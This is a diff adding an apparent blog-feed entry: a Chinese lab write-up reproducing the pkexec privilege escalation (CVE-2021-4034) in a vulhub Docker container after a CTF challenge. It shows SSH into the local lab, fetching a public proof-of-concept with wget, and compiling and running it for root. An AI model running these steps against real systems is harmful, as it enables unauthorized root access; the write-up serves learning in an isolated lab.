@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>pkexec提权（CVE-2021-4034）</title>
+    <link href="/2026/03/23/pkexec%E6%8F%90%E6%9D%83%EF%BC%88CVE-2021-4034%EF%BC%89/"/>
+    <url>/2026/03/23/pkexec%E6%8F%90%E6%9D%83%EF%BC%88CVE-2021-4034%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚打完的长城杯的一个渗透题，开始 Shiro 直接打进去了，结果卡在了提权，这里学习记录一下</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载或复制下面这个<code>docker-compose.yml</code>：<a href="https://github.com/vulhub/vulhub/blob/master/polkit/CVE-2021-4034/docker-compose.yml">https://github.com/vulhub/vulhub/blob/master/polkit/CVE-2021-4034/docker-compose.yml</a></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;2&#x27;</span><br>services:<br> <span class="hljs-keyword">cmd</span><span class="language-bash">:</span><br>   image: vulhub/polkit:<span class="hljs-number">0.105</span><br>   ports:<br>     - <span class="hljs-number">2222</span>:<span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure><p>然后运行下面命令启动环境（有点费时）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323194321940.png" alt="image-20260323194321940"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps<br></code></pre></td></tr></table></figure><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323194539460.png" alt="image-20260323194539460"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>使用 <code>ubuntu/vulhub</code> 登录目标 SSH 服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh ubuntu@127.0.0.1 -p2222<br></code></pre></td></tr></table></figure><p>第一次连接的时候没连接上</p><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323195014553.png" alt="image-20260323195014553"></p><p>不过再试一次就好了</p><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323195101125.png" alt="image-20260323195101125"></p><p>此时是<code>Ubuntu</code>用户</p><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323195134135.png" alt="image-20260323195134135"></p><p>POC地址：<a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><p>有<code>wget</code>命令的话就直接去下载POC了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz<br></code></pre></td></tr></table></figure><p>不过对网络有点要求，我这里失败了</p><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323200759218.png" alt="image-20260323200759218"></p><p>不过既然可以连接 SSH 了，我直接把POC下载到本地，然后用工具连接上传就好啦</p><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323201040118.png" alt="image-20260323201040118"></p><p>大意了，没有<code>unzip</code>命令</p><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323201114924.png" alt="image-20260323201114924"></p><p>就不传压缩包了，改成传文件夹</p><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323201147988.png" alt="image-20260323201147988"></p><p>然后就是可以编译并提权了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> CVE-2021-4034-main<br>make<br>./cve-2021-4034<br></code></pre></td></tr></table></figure><p><img src="/2025/11/12/0xGame2025-WEB-WP/4034%EF%BC%89/image-20260323201329567.png" alt="image-20260323201329567"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透</category>
+      
+      <category>提权</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>提权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>DC-7</title>
     <link href="/2026/02/28/DC-7/"/>
     <url>/2026/02/28/DC-7/</url>
